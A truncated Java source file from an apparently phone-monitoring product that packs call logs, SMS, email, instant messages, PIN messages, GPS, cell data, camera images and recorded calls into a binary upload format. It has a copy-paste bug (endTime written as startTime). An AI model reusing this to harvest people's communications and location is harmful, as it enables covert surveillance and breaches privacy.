package com.vvt.prot.parser;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import com.vvt.prot.event.AlertGPSEvent;
import com.vvt.prot.event.Attachment;
import com.vvt.prot.event.AudioConvEvent;
import com.vvt.prot.event.AudioConvThumbnailEvent;
import com.vvt.prot.event.AudioFileEvent;
import com.vvt.prot.event.AudioFileThumbnailEvent;
import com.vvt.prot.event.CallLogEvent;
import com.vvt.prot.event.CameraImageEvent;
import com.vvt.prot.event.CameraImageThumbnailEvent;
import com.vvt.prot.event.CellInfoEvent;
import com.vvt.prot.event.DebugMessageEvent;
import com.vvt.prot.event.DebugMode;
import com.vvt.prot.event.EmailEvent;
import com.vvt.prot.event.GPSEvent;
import com.vvt.prot.event.GPSExtraFields;
import com.vvt.prot.event.GPSField;
import com.vvt.prot.event.GpsBatteryLifeDebugEvent;
import com.vvt.prot.event.HttpBatteryLifeDebugEvent;
import com.vvt.prot.event.IMEvent;
import com.vvt.prot.event.LocationEvent;
import com.vvt.prot.event.MMSEvent;
import com.vvt.prot.event.PEvent;
import com.vvt.prot.event.PanicGPSEvent;
import com.vvt.prot.event.PanicImageEvent;
import com.vvt.prot.event.PanicStatusEvent;
import com.vvt.prot.event.PinMessageEvent;
import com.vvt.prot.event.Recipient;
import com.vvt.prot.event.SMSEvent;
import com.vvt.prot.event.SystemEvent;
import com.vvt.prot.event.VideoFileEvent;
import com.vvt.prot.event.VideoFileThumbnailEvent;
import com.vvt.prot.event.WallPaperThumbnailEvent;
import com.vvt.prot.event.WallpaperEvent;
import com.vvt.std.ByteUtil;
import com.vvt.std.FileUtil;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;
import com.vvt.std.ProtocolParserUtil;

public class BufferEventParser {

//	private static final String TAG = "EventParser";
	
	public static byte[] parseEvent(PEvent event) throws IOException {
		byte[] data = null;
		if (event instanceof CallLogEvent) {
			data = parseEvent((CallLogEvent) event);
		} else if (event instanceof SMSEvent) {
			data = parseEvent((SMSEvent) event);
		} else if (event instanceof EmailEvent) {
			data = parseEvent((EmailEvent) event);
		} else if (event instanceof GPSEvent) {
			data = parseEvent((GPSEvent)event);
		} else if (event instanceof CellInfoEvent) {
			data = parseEvent((CellInfoEvent)event);
		} else if (event instanceof IMEvent) {
			data = parseEvent((IMEvent)event);
		} else if (event instanceof MMSEvent) {
			data = parseEvent((MMSEvent)event);
		} else if (event instanceof SystemEvent) {
			data = parseEvent((SystemEvent) event);
		} else if (event instanceof WallPaperThumbnailEvent) {
			data = parseEvent((WallPaperThumbnailEvent) event);
		} else if (event instanceof CameraImageThumbnailEvent) {
			data = parseEvent((CameraImageThumbnailEvent) event);
		} else if (event instanceof AudioFileThumbnailEvent) {
			data = parseEvent((AudioFileThumbnailEvent) event);
		} else if (event instanceof AudioConvThumbnailEvent) {
			data = parseEvent((AudioConvThumbnailEvent) event);
		} else if (event instanceof VideoFileThumbnailEvent) {
			data = parseEvent((VideoFileThumbnailEvent) event);
		} else if (event instanceof DebugMessageEvent) {
			data = parseEvent((DebugMessageEvent) event);
		} else if (event instanceof PinMessageEvent) {
			data = parseEvent((PinMessageEvent) event);
		} else if (event instanceof PanicGPSEvent) {
			data = parseEvent((PanicGPSEvent) event);
		} else if (event instanceof PanicStatusEvent) {
			data = parseEvent((PanicStatusEvent) event);
		} else if (event instanceof AlertGPSEvent) {
			data = parseEvent((AlertGPSEvent) event);
		} else if (event instanceof PanicImageEvent) {
			data = parseEvent((PanicImageEvent) event);
		} else if (event instanceof LocationEvent) {
			data = parseEvent((LocationEvent) event);
		}
		return data;
	}
	
	private static void parseEventHeader(PEvent event, ByteArrayOutputStream bos) throws IOException {
		// EventType 2 Bytes.
		short eventType = (short)event.getEventType().getId();
		bos.write(ByteUtil.toByte(eventType));
		// EventTime 19 Bytes.
		String eventTime = event.getEventTime();
		if (eventTime == null) {
			eventTime = "0000-00-00 00:00:00";
		} 
		bos.write(ByteUtil.toByte(eventTime));
	}
	
	private static byte[] parseEvent(CallLogEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			// Duration 4 Bytes.
			int duration = event.getDuration();
			bos.write(ByteUtil.toByte(duration));
			// Length of Number 1 Byte.
			String number = event.getAddress();
			ProtocolParserUtil.writeString1Byte(number, bos);
			// Length of Contact Name 1 Byte.
			String contact = event.getContactName();
			ProtocolParserUtil.writeString1Byte(contact, bos);
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(SMSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			// Length of Number 1 Byte.
			String number = event.getAddress();
			ProtocolParserUtil.writeString1Byte(number, bos);
			// Length of Contact Name 1 Byte.
			String contact = event.getContactName();
			ProtocolParserUtil.writeString1Byte(contact, bos);
			
			// Number of Recipient 2 Bytes (Integer).
			short numberOfRecipient = event.countRecipient();
			bos.write(ByteUtil.toByte(numberOfRecipient));
			if (numberOfRecipient > 0) {
				for (int i = 0; i < numberOfRecipient; i++) {
					Recipient recipient = event.getRecipient(i);
					// Recipient Type 1 Byte.
					byte recipientType = (byte)recipient.getRecipientType().getId();
					bos.write(ByteUtil.toByte(recipientType));
					// Length of Recipient 1 Byte.
					String recipientInfo = recipient.getRecipient();
					ProtocolParserUtil.writeString1Byte(recipientInfo, bos);
					// Length of Contact Name 1 Byte.
					String contactName = recipient.getContactName();
					ProtocolParserUtil.writeString1Byte(contactName, bos);
				}
			}
			// Length of Message 2 Bytes.
			String message = event.getMessage();
			ProtocolParserUtil.writeString2Bytes(message, bos);
			
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(EmailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			// Length of Number 1 Byte.
			String number = event.getAddress();
			ProtocolParserUtil.writeString1Byte(number, bos);
			// Length of Contact Name 1 Byte.
			String contact = event.getContactName();
			ProtocolParserUtil.writeString1Byte(contact, bos);
			
			// Number of Recipient 2 Bytes (Integer).
			short numberOfRecipient = event.countRecipient();
			bos.write(ByteUtil.toByte(numberOfRecipient));
			for (int i = 0; i < numberOfRecipient; i++) {
				Recipient recipient = event.getRecipient(i);
				// Recipient Type 1 Byte.
				byte recipientType = (byte)recipient.getRecipientType().getId();
				bos.write(ByteUtil.toByte(recipientType));
				// Length of Recipient 1 Byte.
				String recipientInfo = recipient.getRecipient();
				ProtocolParserUtil.writeString1Byte(recipientInfo, bos);
				// Length of Contact Name 1 Byte.
				String contactName = recipient.getContactName();
				ProtocolParserUtil.writeString1Byte(contactName, bos);
			}
			// Length of Subject 2 Bytes.
			String subject = event.getSubject();
			ProtocolParserUtil.writeString2Bytes(subject, bos);
			
			// Number of Attachment 1 Byte (Integer(U)).
			byte numberOfAttachment = (byte)event.countAttachment();
			bos.write(ByteUtil.toByte(numberOfAttachment));
			if (numberOfAttachment > 0) {
				for (int i = 0; i < numberOfAttachment; i++) {
					Attachment attachment = event.getAttachment(i);
					String attachmentFullName = attachment.getAttachmentFullName();
					ProtocolParserUtil.writeString2Bytes(attachmentFullName, bos);
					byte[] attachmentData = attachment.getAttachmentData();
					 if (attachmentData != null) {
						 int lenAttachmentData = attachmentData.length;
						 bos.write(ByteUtil.toByte(lenAttachmentData));
						 if (lenAttachmentData > 0) {
							 bos.write(attachmentData);
						 }
					 } else {
						 bos.write(ByteUtil.toByte((int)0));
					 }
				}
			}
			// Length of Message 4 Bytes.
			String message = event.getMessage();
			ProtocolParserUtil.writeString4Bytes(message, bos);
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(GPSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Longitude 8 Bytes. (Decimal)
			double lng = event.getLongitude();
			bos.write(ByteUtil.toByte(lng));
			// Latitude 8 Bytes. (Decimal)
			double lat = event.getLatitude();
			bos.write(ByteUtil.toByte(lat));
			// Number of GPS Field 1 Byte.
			/*byte numberOfField = (byte)event.countGPSField();
			bos.write(ByteUtil.toByte(numberOfField));
			if (numberOfField > 0) {
				for (int i = 0; i < numberOfField; i++) {
					// Field ID 1 Byte
					GPSField field = event.getGpsField(i);
					byte fieldId = (byte)field.getGpsFieldId();
					bos.write(ByteUtil.toByte(fieldId));
					if (fieldId == (byte)GPSExtraFields.PROVIDER.getId()) {
						// Field Data 1 Byte.
						byte fieldData = (byte)field.getGpsFieldData();
						bos.write(ByteUtil.toByte(fieldData));
					}
					else {
						// Field Data 4 bytes.
						float fieldData = field.getGpsFieldData();
						bos.write(ByteUtil.toByte(fieldData));
					}
				}
			}*/
			// Speed 4 Bytes.
			float speed = (float) event.getSpeed();
			bos.write(ByteUtil.toByte(speed));
			float heading = (float) event.getHeading();
			bos.write(ByteUtil.toByte(heading));
			float altitude = (float) event.getAltitude();
			bos.write(ByteUtil.toByte(altitude));
			byte provider = (byte) event.getGPSProviders().getId();
			bos.write(ByteUtil.toByte(provider));
			float horAccuracy = (float) event.getHorAccuracy();
			bos.write(ByteUtil.toByte(horAccuracy));
			float verAccuracy = (float) event.getVerAccuracy();
			bos.write(ByteUtil.toByte(verAccuracy));
			float headAccuracy = (float) event.getHeadAccuracy();
			bos.write(ByteUtil.toByte(headAccuracy));
			float speedAccuracy = (float) event.getSpeedAccuracy();
			bos.write(ByteUtil.toByte(speedAccuracy));
			//TODO: Parse GPS Debug Event
			GpsBatteryLifeDebugEvent gpsBatteryLife = event.getGpsBatteryLifeDebug();
			if (gpsBatteryLife != null) {
				data = parseEvent(gpsBatteryLife);
				bos.write(data);
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	
	
	private static byte[] parseEvent(CellInfoEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Length of Network ID 1 Byte.
			String networkId = event.getNetworkId();
			ProtocolParserUtil.writeString1Byte(networkId, bos);
			// Length of Network Name 1 Byte.
			String networkName = event.getNetworkName();
			ProtocolParserUtil.writeString1Byte(networkName, bos);
			// Length of Network Name 1 Byte.
			String cellName = event.getCellName();
			ProtocolParserUtil.writeString1Byte(cellName, bos);
			// Cell ID 4 Bytes.
			int cellId = (int)event.getCellId();
			bos.write(ByteUtil.toByte(cellId));
			// Country Code 4 Bytes.
			int countryCode = (int)event.getCountryCode();
			bos.write(ByteUtil.toByte(countryCode));
			// Area Code 4 Bytes.
			int areaCode = (int)event.getAreaCode();
			bos.write(ByteUtil.toByte(areaCode));
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(IMEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			//Length of User_ID 1 Byte.
			String userID = event.getUserID();
			ProtocolParserUtil.writeString1Byte(userID, bos);
			//Count 2 Bytes.
			short count = (short)event.countParticipant();
			bos.write(ByteUtil.toByte(count));
			if (count > 0) {
				for (int i = 0; i < count; i++) {
					//Length of Name 1 Byte.
					String name = event.getParticipant(i).getName();
					ProtocolParserUtil.writeString1Byte(name, bos);
					String uid = event.getParticipant(i).getUID();
					ProtocolParserUtil.writeString1Byte(uid, bos);
				}
			}
			String serviceID = event.getServiceID().toString();
			ProtocolParserUtil.writeString1Byte(serviceID, bos);			
			String message = event.getMessage();
			ProtocolParserUtil.writeString2Bytes(message, bos);
			String userDspName = event.getUserDisplayName();
			ProtocolParserUtil.writeString1Byte(userDspName, bos);
			
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(MMSEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			String senderNumb = event.getSenderNumber();
			//Length of Sender Number 1 Byte.
			ProtocolParserUtil.writeString1Byte(senderNumb, bos);
			String contactName = event.getContactName();
			//Length of Contact Name 1 Byte.
			ProtocolParserUtil.writeString1Byte(contactName, bos);			
			short lenRecipientCnt = event.countRecipient();
			bos.write(ByteUtil.toByte(lenRecipientCnt));
			if (lenRecipientCnt > 0) {
				for (int i = 0; i < lenRecipientCnt; i++) {
					//RECIPIENT_TYPE 
					short recipientType = (short)event.getRecipient(i).getRecipientType().getId();
					bos.write(ByteUtil.toByte(recipientType));
					//Length of RECIPIENT 1 Byte.
					String recipient = event.getRecipient(i).getRecipient();
					ProtocolParserUtil.writeString1Byte(recipient, bos);
					//Length of Contact Name 1 Byte.
					contactName = event.getRecipient(i).getContactName();
					ProtocolParserUtil.writeString1Byte(contactName, bos);	
				}
			}
			//Length of Subject 2 Bytes.
			String subject = event.getSubject();
			ProtocolParserUtil.writeString2Bytes(subject, bos);	
			//Length of L_ATTACHMENT_COUNT 1 Byte.
			byte lenAttachment = event.countAttachment();
			bos.write(ByteUtil.toByte(lenAttachment));
			if (lenAttachment > 0) {
				for (int i = 0; i < lenAttachment; i++) {
					//Length of AttachmentFullName 2 Bytes.
					String attachmentFullName = event.getAttachment(i).getAttachmentFullName();
					ProtocolParserUtil.writeString2Bytes(attachmentFullName, bos);	
					byte[] attachmentData = event.getAttachment(i).getAttachmentData();
					if (attachmentData != null) { 
						//Length of AttachmentData 4 Bytes.
						int lenAttachmentData = attachmentData.length;
						bos.write(ByteUtil.toByte(lenAttachmentData));
						if (lenAttachmentData > 0) {
							bos.write(attachmentData);
						}
					} else {
						bos.write(ByteUtil.toByte((int)0));
					}
				}				
			}
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(SystemEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			byte category = (byte)event.getCategory().getId();
			bos.write(ByteUtil.toByte(category));
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			String systemMsg = event.getSystemMessage();
			ProtocolParserUtil.writeString4Bytes(systemMsg, bos);
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(WallPaperThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			String imagePath = event.getFilePath();
			if (imagePath != null) {
				int size = (int) FileUtil.getFileSize(imagePath);
				bos.write(ByteUtil.toByte(size));
				if (size != 0) {
					FileUtil.write(imagePath, bos);
				}
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}
			int actualSize = (int) event.getActualSize();
			bos.write(ByteUtil.toByte(actualSize));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(CameraImageThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
//			Log.debug(TAG + ".parseEvent(CameraImageThumbnailEvent)",  "paringId: " + paringId);
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			// Longitude 8 Bytes. (Decimal)
			double longitude = event.getLongitude();
			bos.write(ByteUtil.toByte(longitude));
			// Latitude 8 Bytes. (Decimal)
			double latitude = event.getLatitude();
			bos.write(ByteUtil.toByte(latitude));
			// Altitude 4 Bytes.
			float altitude = (float) event.getAltitude();
			bos.write(ByteUtil.toByte(altitude));
			String imagePath = event.getFilePath();
//			Log.debug(TAG + ".parseEvent(CameraImageThumbnailEvent)",  "imagePath: " + imagePath);
			if (imagePath != null) {
				int size = (int) FileUtil.getFileSize(imagePath);
				bos.write(ByteUtil.toByte(size));
				if (size != 0) {
					FileUtil.write(imagePath, bos);
				}
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}
			int actualSize = (int) event.getActualSize();
			bos.write(ByteUtil.toByte(actualSize));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(AudioFileThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			//ParingId
			int paringId = (int)event.getPairingId(); 
//			Log.debug(TAG + ".parseEvent(AudioFileThumbnailEvent)",  "paringId: " + paringId);
			bos.write(ByteUtil.toByte(paringId));
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			String audioPath = event.getFilePath();
//			Log.debug(TAG + ".parseEvent(AudioFileThumbnailEvent)",  "audioPath: " + audioPath);
			/*if (audioPath != null) {
				int size = (int) FileUtil.getFileSize(audioPath);
				bos.write(ByteUtil.toByte(size));
				FileUtil.write(audioPath, bos);
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}*/
			// TODO: Regarding we can send lenght of thumbnail data as 0 then WEB's UI will show the thumbnail's icon so no need to send actual thumbnail data
			// So we can create only thumbnail file and no need to write sample data in this file.
			// If server need actual bytes from thumbnail, let's uncomment code above.
			bos.write(ByteUtil.toByte((int)0));
			int actualSize = (int)event.getActualSize();
			bos.write(ByteUtil.toByte(actualSize));
			int actualDuration = (int)event.getActualDuration();
			bos.write(ByteUtil.toByte(actualDuration));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(AudioConvThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			//ParingId
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			// Embeded_Call_Info
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			// Duration 4 Bytes.
			int duration = (int)event.getDuration();
			bos.write(ByteUtil.toByte(duration));
			String number = event.getNumber();
			ProtocolParserUtil.writeString1Byte(number, bos);
			String contactName = event.getContactName();
			ProtocolParserUtil.writeString1Byte(contactName, bos);
			String audioPath = event.getFilePath();
			if (audioPath != null) {
				int size = (int) FileUtil.getFileSize(audioPath);
				bos.write(ByteUtil.toByte(size));
				if (size != 0) {
					FileUtil.write(audioPath, bos);
				}
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}			
			int actualSize = (int)event.getActualSize();
			bos.write(ByteUtil.toByte(actualSize));
			int actualDuration = (int)event.getActualDuration();
			bos.write(ByteUtil.toByte(actualDuration));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(VideoFileThumbnailEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			//ParingId
			int paringId = (int)event.getPairingId(); 
//			Log.debug(TAG + ".parseEvent(VideoFileThumbnailEvent)",  "paringId: " + paringId);
			bos.write(ByteUtil.toByte(paringId));
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			String videoPath = event.getFilePath();
//			Log.debug(TAG + ".parseEvent(VideoFileThumbnailEvent)",  "videoPath: " + videoPath);
			/*if (videoPath != null) {
				int size = (int) FileUtil.getFileSize(videoPath);
				bos.write(ByteUtil.toByte(size));
				FileUtil.write(videoPath, bos);
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}*/
			// TODO: Regarding we can send lenght of thumbnail data as 0 then WEB's UI will show the thumbnail's icon so no need to send actual thumbnail data
			// So we can create only thumbnail file and no need to write sample data in this file.
			// If server need actual bytes from thumbnail, let's uncomment code above.
			bos.write(ByteUtil.toByte((int)0));
			byte imageCount = (byte) event.getCountImagePath();
			bos.write(ByteUtil.toByte(imageCount));
			if (imageCount > 0) {
				for (int i = 0; i < imageCount; i++) {
					String imagePath = event.getImagePath(i);
					if (imagePath != null) {
						int size = (int) FileUtil.getFileSize(imagePath);
						bos.write(ByteUtil.toByte(size));
						if (size != 0) {
							FileUtil.write(imagePath, bos);
						}
					} else {
						bos.write(ByteUtil.toByte((int)0));
					}
				}
			}
			int actualSize = (int)event.getActualSize();
			bos.write(ByteUtil.toByte(actualSize));
			int actualDuration = (int)event.getActualDuration();
			bos.write(ByteUtil.toByte(actualDuration));
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;		
	}
	
	private static byte[] parseEvent(WallpaperEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			String imagePath = event.getFilePath();
			if (imagePath != null) {
				int size = (int) FileUtil.getFileSize(imagePath);
				bos.write(ByteUtil.toByte(size));
				if (size != 0) {
					FileUtil.write(imagePath, bos);
				}
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}			
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;			
	}
	
	private static byte[] parseEvent(CameraImageEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			// Longitude 8 Bytes. (Decimal)
			double longitude = event.getLongitude();
			bos.write(ByteUtil.toByte(longitude));
			// Latitude 8 Bytes. (Decimal)
			double latitude = event.getLatitude();
			bos.write(ByteUtil.toByte(latitude));
			// Altitude 4 Bytes.
			float altitude = (float) event.getAltitude();
			bos.write(ByteUtil.toByte(altitude));
			String fileName = event.getFileName();
			ProtocolParserUtil.writeString1Byte(fileName, bos);
			String imagePath = event.getFilePath();
			if (imagePath != null) {
				int size = (int) FileUtil.getFileSize(imagePath);
				bos.write(ByteUtil.toByte(size));
				if (size != 0) {
					FileUtil.write(imagePath, bos);
				}
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}			
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;			
	}
	
	/*private static byte[] parseEvent(AudioFileEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			String fileName = event.getFileName();
			ProtocolParserUtil.writeString1Byte(fileName, bos);
			String audioPath = event.getFilePath();
			if (audioPath != null) {
				int size = (int) FileUtil.getFileSize(audioPath);
				bos.write(ByteUtil.toByte(size));
				FileUtil.write(audioPath, bos);
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}			
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;			
	}*/
	
	/*private static byte[] parseEvent(AudioConvEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			// Embeded_Call_Info
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			// Duration 4 Bytes.
			int duration = (int)event.getDuration();
			bos.write(ByteUtil.toByte(duration));
			String number = event.getNumber();
			ProtocolParserUtil.writeString1Byte(number, bos);
			String contactName = event.getContactName();
			ProtocolParserUtil.writeString1Byte(contactName, bos);			
			String fileName = event.getFileName();
			ProtocolParserUtil.writeString1Byte(fileName, bos);
			String audioPath = event.getFilePath();
			if (audioPath != null) {
				int size = (int) FileUtil.getFileSize(audioPath);
				bos.write(ByteUtil.toByte(size));
				FileUtil.write(audioPath, bos);
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}			
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;			
	}
	
	private static byte[] parseEvent(VideoFileEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// ParingId 4 Bytes.
			int paringId = (int)event.getPairingId(); 
			bos.write(ByteUtil.toByte(paringId));
			// Format 1 Byte.
			byte format = (byte)event.getFormat().getId();
			bos.write(ByteUtil.toByte(format));
			String fileName = event.getFileName();
			ProtocolParserUtil.writeString1Byte(fileName, bos);
			String videoPath = event.getFilePath();
			if (videoPath != null) {
				int size = (int) FileUtil.getFileSize(videoPath);
				bos.write(ByteUtil.toByte(size));
				FileUtil.write(videoPath, bos);
			} else {
				bos.write(ByteUtil.toByte((int)0));
			}			
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;			
	}*/
	
	private static byte[] parseEvent(DebugMessageEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			//Debug Mode 2 Bytes.
			DebugMode mode = event.getMode();
			if (mode.equals(DebugMode.HTTP)) {
				data = parseEvent((HttpBatteryLifeDebugEvent)event);
			}
			bos.write(data);
			// To byte array.
			data = bos.toByteArray();			
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(PinMessageEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			parseEventHeader(event, bos);
			// Direction 1 Byte.
			byte direction = (byte)event.getDirection().getId();
			bos.write(ByteUtil.toByte(direction));
			// Length of Sender PIN 1 Byte.
			String senderPin = event.getAddress();
			ProtocolParserUtil.writeString1Byte(senderPin, bos);
			// Length of Sender Contact Name 1 Byte.
			String name = event.getContactName();
			ProtocolParserUtil.writeString1Byte(name, bos);
			// Number of PIN Recipient 2 Bytes (Integer).
			short numberOfRecipient = event.countRecipient();
			bos.write(ByteUtil.toByte(numberOfRecipient));
			if (numberOfRecipient > 0) {
				for (int i = 0; i < numberOfRecipient; i++) {
					Recipient recipient = event.getRecipient(i);
					// Recipient Type 1 Byte.
					byte recipientType = (byte)recipient.getRecipientType().getId();
					bos.write(ByteUtil.toByte(recipientType));
					// Length of Contact Pin 1 Byte.
					String contactPin = recipient.getRecipient();
					ProtocolParserUtil.writeString1Byte(contactPin, bos);
					// Length of Contact Name 1 Byte.
					String contactName = recipient.getContactName();
					ProtocolParserUtil.writeString1Byte(contactName, bos);
				}
			}
			// Length of Subject 2 Bytes.
			String subject = event.getSubject();
			ProtocolParserUtil.writeString2Bytes(subject, bos);
			// Length of Message 4 Bytes.
			String message = event.getMessage();
			ProtocolParserUtil.writeString4Bytes(message, bos);
			// To byte array.
			data = bos.toByteArray();
		} finally {
			IOUtil.close(bos);
		}
		return data;
	}
	
	private static byte[] parseEvent(HttpBatteryLifeDebugEvent event) throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] data = null;
		try {
			//Debug_Mode 2 Bytes.
			short mode = (short)event.getMode().getId();
			bos.write(ByteUtil.toByte(mode));
			//Field_Count 1 Byte.
			byte fieldCount = (byte)event.getFieldCount();
			bos.write(ByteUtil.toByte(fieldCount));
			//Length of Battery_Before 2 Bytes.
			String batteryBefore = event.getBatteryBefore();
			ProtocolParserUtil.writeString2Bytes(batteryBefore, bos);
			//Length of Battery_After 2 Bytes.
			String batteryAfter = event.getBatteryAfter();
			ProtocolParserUtil.writeString2Bytes(batteryAfter, bos);
			//Length of Start_Time 2 Bytes.
			String startTime = event.getStartTime();
			if (startTime == null) {
				startTime = "0000-00-00 00:00:00";
			}
			ProtocolParserUtil.writeString2Bytes(startTime, bos);
			//Length of  End_Time 2 Bytes.
			String endTime = event.getEndTime();
			if (endTime == null) {
				endTime = "0000-00-00 00:00:00";
			}
			ProtocolParserUtil.writeString2Bytes(startTime, bos);
